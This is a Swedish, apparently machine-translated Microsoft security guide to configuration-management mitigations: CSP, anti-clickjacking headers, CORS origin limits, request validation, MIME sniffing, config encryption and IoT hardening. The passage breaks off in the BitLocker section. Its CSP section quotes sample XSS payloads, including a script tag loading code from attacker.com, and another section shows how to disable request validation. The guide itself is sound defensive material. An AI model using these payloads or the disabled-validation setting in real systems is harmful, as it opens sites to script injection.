---
title: Konfigurationshantering för Microsoft Threat Modeling Tool
titleSuffix: Azure
description: mildrande åtgärder för hot som exponeras i hotmodelleringsverktyget
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 04/21/2020
ms.locfileid: "81687979"
---
# <a name="security-frame-configuration-management--mitigations"></a>Säkerhetsram: Konfigurationshantering | Mitigations 
| Produkt/tjänst | Artikel |
| --------------- | ------- |
| **Webbprogram** | <ul><li>[Implementera innehållssäkerhetsprincip (CSP) och inaktivera inline javascript](#csp-js)</li><li>[Aktivera webbläsarens XSS-filter](#xss-filter)</li><li>[ASP.NET program måste inaktivera spårning och felsökning före distribution](#trace-deploy)</li><li>[Endast åtkomst till javascript från tredje part från betrodda källor](#js-trusted)</li><li>[Se till att autentiserade ASP.NET sidor innehåller UI Redressing eller click-jacking försvar](#ui-defenses)</li><li>[Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET webbprogram](#cors-aspnet)</li><li>[Aktivera Attributet ValidateRequest på ASP.NET sidor](#validate-aspnet)</li><li>[Använda lokalt värdbaserade senaste versioner av JavaScript-bibliotek](#local-js)</li><li>[Inaktivera automatisk MIME-sniffning](#mime-sniff)</li><li>[Ta bort standardserverhuvuden på Windows Azure-webbplatser för att undvika fingeravtryck](#standard-finger)</li></ul> |
| **Databas** | <ul><li>[Konfigurera en Windows-brandvägg för databasmotoråtkomst](#firewall-db)</li></ul> |
| **Webb-API** | <ul><li>[Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET webb-API](#cors-api)</li><li>[Kryptera delar av webb-API:s konfigurationsfiler som innehåller känsliga data](#config-sensitive)</li></ul> |
| **IoT-enhet** | <ul><li>[Se till att alla administratörsgränssnitt är säkrade med starka autentiseringsuppgifter](#admin-strong)</li><li>[Kontrollera att okänd kod inte kan köras på enheter](#unknown-exe)</li><li>[Kryptera OS och ytterligare partitioner av IoT-enhet med bit-skåp](#partition-iot)</li><li>[Se till att endast de minsta tjänsterna/funktionerna är aktiverade på enheter](#min-enable)</li></ul> |
| **IoT-fältgateway** | <ul><li>[Kryptera OS och ytterligare partitioner av IoT Field Gateway med bit-locker](#field-bit-locker)</li><li>[Kontrollera att standardinloggningsuppgifterna för fältgatewayen ändras under installationen](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Se till att Cloud Gateway implementerar en process för att hålla den anslutna programvaran uppdaterad](#cloud-firmware)</li></ul> |
| **Gräns för datorförtroende** | <ul><li>[Kontrollera att enheter har säkerhetskontroller för slutpunkt som har konfigurerats enligt organisationsprinciper](#controls-policies)</li></ul> |
| **Azure-lagring** | <ul><li>[Säkerställ säker hantering av Azure-lagringsåtkomstnycklar](#secure-keys)</li><li>[Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på Azure-lagring](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Aktivera WCF:s funktion för strypning av tjänster](#throttling)</li><li>[WCF-Information utlämnande via metadata](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementera innehållssäkerhetsprincip (CSP) och inaktivera inline javascript

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [En introduktion till content security policy,](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) [content security policy reference](https://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduktion till innehållssäkerhetsprincip](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), Kan jag använda [CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Steg** | <p>Content Security Policy (CSP) är en djupgående säkerhetsmekanism, en W3C-standard, som gör det möjligt för webbprogramägare att ha kontroll över innehållet inbäddade på sin webbplats. CSP läggs till som ett HTTP-svarshuvud på webbservern och tillämpas på klientsidan av webbläsare. Det är en vitlistbaserad princip - en webbplats kan deklarera en uppsättning betrodda domäner från vilka aktivt innehåll som JavaScript kan läsas in.</p><p>CSP ger följande säkerhetsfördelar:</p><ul><li>**Skydd mot XSS:** Om en sida är sårbar för XSS kan en angripare utnyttja den på två sätt:<ul><li>Injicera `<script>malicious code</script>`. Denna utnyttja kommer inte att fungera på grund av CSP: s Base Restriction-1</li><li>Injicera `<script src="http://attacker.com/maliciousCode.js"/>`. Den här exploateringen fungerar inte eftersom den angripare kontrollerade domänen inte kommer att vara i CSP: s vitlista över domäner</li></ul></li><li>**Kontroll över dataexfiltration:** Om skadligt innehåll på en webbsida försöker ansluta till en extern webbplats och stjäla data avbryts anslutningen av CSP. Detta beror på att måldomänen inte kommer att finnas i CSP:s vitlista</li><li>**försvar mot klick-jacking:** click-jacking är en attack teknik som använder som en motståndare kan rama in en äkta webbplats och tvinga användare att klicka på UI element. För närvarande försvar mot klick-jacking uppnås genom att konfigurera ett svar header-X-Frame-Alternativ. Inte alla webbläsare respektera denna rubrik och framöver CSP kommer att vara ett standardiserat sätt att försvara sig mot klick-jacking</li><li>**Rapportering av angrepp i realtid:** Om det sker en injektionsattack på en CSP-aktiverad webbplats utlöser webbläsare automatiskt ett meddelande till en slutpunkt som konfigurerats på webbservern. På så sätt fungerar CSP som ett varningssystem i realtid.</li></ul> |

### <a name="example"></a>Exempel
Exempel på policy: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Den här principen gör att skript endast kan läsas in från webbprogrammets server och Google Analytics-server. Skript som läses in från en annan plats kommer att avvisas. När CSP är aktiverat på en webbplats inaktiveras följande funktioner automatiskt för att minska XSS-attacker. 

### <a name="example"></a>Exempel
Infogade skript kommer inte att köras. Följande är exempel på infogade skript 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Exempel
Strängar utvärderas inte som kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Aktivera webbläsarens XSS-filter

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [XSS-skyddsfilter](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Steg** | <p>X-XSS-Protection svarshuvud konfiguration styr webbläsarens korsplats skriptfilter. Det här svarshuvudet kan ha följande värden:</p><ul><li>`0:`Detta kommer att inaktivera filtret</li><li>`1: Filter enabled`Om en skriptattack på flera webbplatser upptäcks, för att stoppa attacken, kommer webbläsaren att sanera sidan</li><li>`1: mode=block : Filter enabled`. I stället för att sanera sidan, när en XSS-attack upptäcks, kommer webbläsaren att förhindra rendering av sidan</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Webbläsaren kommer att sanera sidan och rapportera överträdelsen.</li></ul><p>Detta är en kromfunktion som använder CSP-överträdelserapporter för att skicka information till en URI som du väljer. De senaste 2 alternativen betraktas som säkra värden.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET program måste inaktivera spårning och felsökning före distribution

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [ASP.NET Felsökningsöversikt](https://msdn.microsoft.com/library/ms227556.aspx) [ASP.NET spårningsöversikt](https://msdn.microsoft.com/library/bb386420.aspx), [Så här aktiverar du spårning för ett ASP.NET-program](https://msdn.microsoft.com/library/0x5wc973.aspx), [Så här aktiverar du Felsökning för ASP.NET program](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Steg** | När spårning är aktiverat för sidan hämtar varje webbläsare som begär den också spårningsinformationen som innehåller data om internt servertillstånd och arbetsflöde. Den informationen kan vara säkerhetskänslig. När felsökning är aktiverat för sidan resulterar fel som inträffar på servern i en fullständig stackspårningsdata som presenteras för webbläsaren. Dessa data kan visa säkerhetskänslig information om serverns arbetsflöde. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Endast åtkomst till javascript från tredje part från betrodda källor

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Javascript från tredje part bör endast refereras från tillförlitliga källor. Referensslutpunkterna ska alltid finnas på SSL. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Se till att autentiserade ASP.NET sidor innehåller UI Redressing eller click-jacking försvar

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [OWASP klicka-jacking Defense lathund](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Bekämpa klicka-jacking med X-Frame-Alternativ](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Steg** | <p>click-jacking, även känd som en "UI redress attack", är när en angripare använder flera genomskinliga eller ogenomskinliga lager för att lura en användare att klicka på en knapp eller länk på en annan sida när de hade för avsikt att klicka på den översta sidan.</p><p>Detta skiktning uppnås genom att skapa en skadlig sida med en iframe, som laddar offrets sida. Således är angriparen "kapning" klick avsedda för deras sida och routing dem till en annan sida, troligen ägs av ett annat program, domän, eller båda. Om du vill förhindra klick-jacking-attacker anger du rätt HTTP-svarshuvuden för X-Frame-Options som instruerar webbläsaren att inte tillåta inramning från andra domäner</p>|

### <a name="example"></a>Exempel
X-FRAME-OPTIONS-huvudet kan ställas in via IIS web.config. Web.config kodavsnitt för webbplatser som aldrig bör utformas: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exempel
Web.config-kod för webbplatser som endast ska ramas in av sidor i samma domän: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET webbprogram

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Webbformulär, MVC5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas principen för samma ursprung och förhindrar att en skadlig plats läser känsliga data från en annan plats. Ibland kan det dock krävas att API:er exponeras på ett säkert sätt vilka andra webbplatser som kan använda. Cross Origin Resource Sharing (CORS) är en W3C-standard som gör att en server kan koppla av principen med samma ursprung. Med CORS kan en server uttryckligen tillåta vissa begäranden med flera ursprung samtidigt som andra avvisas.</p><p>CORS är säkrare och mer flexibelt än tidigare tekniker som JSONP. I grunden, aktivera CORS översätter till att lägga till några HTTP-svarshuvuden (Access-Control-*) till webbprogrammet och detta kan göras på ett par sätt.</p>|

### <a name="example"></a>Exempel
Om åtkomst till Web.config är tillgänglig kan CORS läggas till via följande kod: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exempel
Om åtkomst till web.config inte är tillgänglig kan CORS konfigureras genom att lägga till följande CSharp-kod: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Observera att det är viktigt att se till att ursprungslistan i attributet "Access-Control-Allow-Origin" är inställd på en begränsad och betrodd ursprungsuppsättning. Om du inte konfigurerar detta på ett olämpligt sätt (t.ex. om du anger värdet som '*') kan skadliga webbplatser utlösa begäranden med korsursprung till webbprogrammet >utan några begränsningar, vilket gör programmet sårbart för CSRF-attacker. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Aktivera Attributet ValidateRequest på ASP.NET sidor

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Webbformulär, MVC5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Begär validering - Förhindra skriptattacker](https://www.asp.net/whitepapers/request-validation) |
| **Steg** | <p>Begär validering, en funktion i ASP.NET sedan version 1.1, hindrar servern från att acceptera innehåll som innehåller okodad HTML. Den här funktionen är utformad för att förhindra vissa skript-injektion attacker där klientskriptkod eller HTML kan omedvetet skickas till en server, lagras och sedan presenteras för andra användare. Vi rekommenderar fortfarande starkt att du validerar alla indata och HTML-koda den när det är lämpligt.</p><p>Begär validering utförs genom att jämföra alla indata med en lista över potentiellt farliga värden. Om en matchning inträffar höjer `HttpRequestValidationException`ASP.NET en . Som standard är funktionen Begär validering aktiverad.</p>|

### <a name="example"></a>Exempel
Den här funktionen kan dock inaktiveras på sidnivå: 
```XML
<%@ Page validateRequest="false" %> 
```
eller, på applikationsnivå 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observera att funktionen Begär validering inte stöds och inte är en del av MVC6-pipelinen. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Använda lokalt värdbaserade senaste versioner av JavaScript-bibliotek

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | <p>Utvecklare som använder vanliga JavaScript-bibliotek som JQuery måste använda godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhetsbrister. En bra idé är att använda den senaste versionen av biblioteken, eftersom de innehåller säkerhetskorrigeringar för kända säkerhetsproblem i sina äldre versioner.</p><p>Om den senaste versionen inte kan användas på grund av kompatibilitetsskäl bör nedanstående minimiversioner användas.</p><p>Godtagbara minimiversioner:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validera 1,9</li><li>JQuery Mobil 1.0.1</li><li>JQuery Cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax kontroll verktygslåda**<ul><li>Ajax Kontroll Verktygslåda 40412</li></ul></li><li>**ASP.NET webbformulär och Ajax**<ul><li>ASP.NET webbformulär och Ajax 4</li><li>ASP.NET Ajax 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Läs aldrig in något JavaScript-bibliotek från externa webbplatser som offentliga CDN-nätverk</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Inaktivera automatisk MIME-sniffning

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [IE8 Säkerhet Del V: Omfattande skydd](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME typ](https://en.wikipedia.org/wiki/Mime_type) |
| **Steg** | X-Content-Type-Options-huvudet är ett HTTP-huvud som gör det möjligt för utvecklare att ange att deras innehåll inte ska MIME-sniffas. Det här huvudet är utformat för att minska MIME-Sniffing-attacker. För varje sida som kan innehålla användarkontrollbart innehåll måste du använda HTTP Header X-Content-Type-Options:nosniff. Om du vill aktivera den rubrik som krävs globalt för alla sidor i programmet kan du göra något av följande|

### <a name="example"></a>Exempel
Lägg till huvudet i filen web.config om programmet finns i Internet Information Services (IIS) 7 och framåt. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exempel
Lägg till rubriken via\_det globala programmet BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exempel
Implementera anpassad HTTP-modul 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exempel
Du kan aktivera det obligatoriska huvudet endast för specifika sidor genom att lägga till det i enskilda svar: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Ta bort standardserverhuvuden på Windows Azure-webbplatser för att undvika fingeravtryck

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | EnvironmentType - Azure |
| **Referenser**              | [Ta bort standardserverhuvuden på Windows Azure-webbplatser](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Steg** | Rubriker som Server, X-Powered-By, X-AspNet-Version avslöjar information om servern och de underliggande teknikerna. Det rekommenderas att undertrycka dessa rubriker och därmed förhindra att programmet tas fingeravtryck |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurera en Windows-brandvägg för databasmotoråtkomst

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Databas | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | SQL Azure, OnPrem |
| **Attribut**              | Ej till och med SQL-version – V12 |
| **Referenser**              | [Konfigurera en Azure SQL-databasbrandvägg](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurera en Windows-brandvägg för databasmotoråtkomst](https://msdn.microsoft.com/library/ms175043) |
| **Steg** | Brandväggssystem hjälper till att förhindra obehörig åtkomst till datorresurser. Om du vill komma åt en instans av SQL Server Database Engine via en brandvägg måste du konfigurera brandväggen på datorn som kör SQL Server för att tillåta åtkomst |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på ASP.NET webb-API

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | MVC 5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera begäranden över flera ursprung i ASP.NET webb-API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [ASP.NET webb-API - CORS-stöd i ASP.NET Webb-API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas principen för samma ursprung och förhindrar att en skadlig plats läser känsliga data från en annan plats. Ibland kan det dock krävas att API:er exponeras på ett säkert sätt vilka andra webbplatser som kan använda. Cross Origin Resource Sharing (CORS) är en W3C-standard som gör att en server kan koppla av principen med samma ursprung.</p><p>Med CORS kan en server uttryckligen tillåta vissa begäranden med flera ursprung samtidigt som andra avvisas. CORS är säkrare och mer flexibelt än tidigare tekniker som JSONP.</p>|

### <a name="example"></a>Exempel
Lägg till följande kod i metoden WebApiConfig.Register i App_Start/WebApiConfig.cs 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exempel
Attributet EnableCors kan tillämpas på åtgärdsmetoder i en styrenhet enligt följande: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observera att det är viktigt att se till att ursprungslistan i Attributet EnableCors är inställd på en begränsad och betrodd ursprungsuppsättning. Om du inte konfigurerar detta på ett olämpligt sätt (t.ex. om du anger värdet som '*') kan skadliga platser utlösa begäranden mellan ursprung till API:et utan några begränsningar, >vilket gör API:et sårbart för CSRF-attacker. EnableCors kan dekoreras på styrenhetsnivå. 

### <a name="example"></a>Exempel
Om du vill inaktivera CORS på en viss metod i en klass kan attributet DisableCors användas enligt nedan: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | MVC 6 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera Cors -begäranden (Cross-Origin Requests) i ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Steg** | <p>I ASP.NET Core 1.0 kan CORS aktiveras antingen med mellanprogram eller med MVC. När du använder MVC för att aktivera CORS används samma CORS-tjänster, men inte CORS-mellangodset.</p>|

**Tillvägagångssätt-1** Aktivera CORS med middleware: För att aktivera CORS för hela programmet lägger du till CORS-mellangodset i begäran pipelinen med hjälp av Metoden UseCors extension. En princip med flera ursprung kan anges när cors-medelprogramet lägger till med klassen CorsPolicyBuilder. Det finns två sätt att göra detta:

### <a name="example"></a>Exempel
Den första är att kalla UseCors med en lambda. Lambda tar ett CorsPolicyBuilder-objekt: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exempel
Det andra är att definiera en eller flera namngivna CORS-principer och sedan välja principen efter namn vid körning. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Tillvägagångssätt-2** Aktivera CORS i MVC: Utvecklare kan alternativt använda MVC för att tillämpa specifika CORS per åtgärd, per styrenhet eller globalt för alla styrenheter.

### <a name="example"></a>Exempel
Per åtgärd: Om du vill ange en CORS-princip för en viss åtgärd lägger du till attributet [EnableCors] i åtgärden. Ange principnamnet. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exempel
Per styrenhet: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exempel
Globalt: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observera att det är viktigt att se till att ursprungslistan i Attributet EnableCors är inställd på en begränsad och betrodd ursprungsuppsättning. Om du inte konfigurerar detta på ett olämpligt sätt (t.ex. om du anger värdet som '*') kan skadliga platser utlösa begäranden mellan ursprung till API:et utan några begränsningar, >vilket gör API:et sårbart för CSRF-attacker. 

### <a name="example"></a>Exempel
Om du vill inaktivera CORS för en styrenhet eller åtgärd använder du attributet [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Kryptera delar av webb-API:s konfigurationsfiler som innehåller känsliga data

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Kryptera konfigurationsavsnitt i ASP.NET 2.0 med DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Ange en skyddad konfigurationsprovider](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Använda Azure Key Vault för att skydda programhemligheter](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Steg** | Konfigurationsfiler som Web.config, appsettings.json används ofta för att lagra känslig information, inklusive användarnamn, lösenord, databasanslutningssträngar och krypteringsnycklar. Om du inte skyddar den här informationen är ditt program sårbart för angripare eller illvilliga användare som hämtar känslig information som kontoanvändarnamn och lösenord, databasnamn och servernamn. Baserat på distributionstypen (azure/on-prem) krypterar du känsliga avsnitt av konfigurationsfiler med DPAPI eller tjänster som Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Se till att alla administratörsgränssnitt är säkrade med starka autentiseringsuppgifter

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Alla administrativa gränssnitt som enheten eller fältgatewayen exponerar bör skyddas med hjälp av starka autentiseringsuppgifter. Dessutom bör alla andra exponerade gränssnitt som WiFi, SSH, File aktier, FTP säkras med starka referenser. Svaga standardlösenord bör inte användas. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Kontrollera att okänd kod inte kan köras på enheter

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera säker start- och bitskåpenhetskryptering på Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Steg** | UEFI Secure Boot begränsar systemet så att endast tillåta körning av binärfiler som signerats av en angiven myndighet. Den här funktionen förhindrar att okänd kod körs på plattformen och kan försvaga säkerhetshållningen för den. Aktivera UEFI Secure Boot och begränsa listan över certifikatutfärdare som är betrodda för signeringskod. Signera all kod som distribueras på enheten med hjälp av en av de betrodda myndigheterna. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Kryptera OS och ytterligare partitioner av IoT-enhet med bit-skåp

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
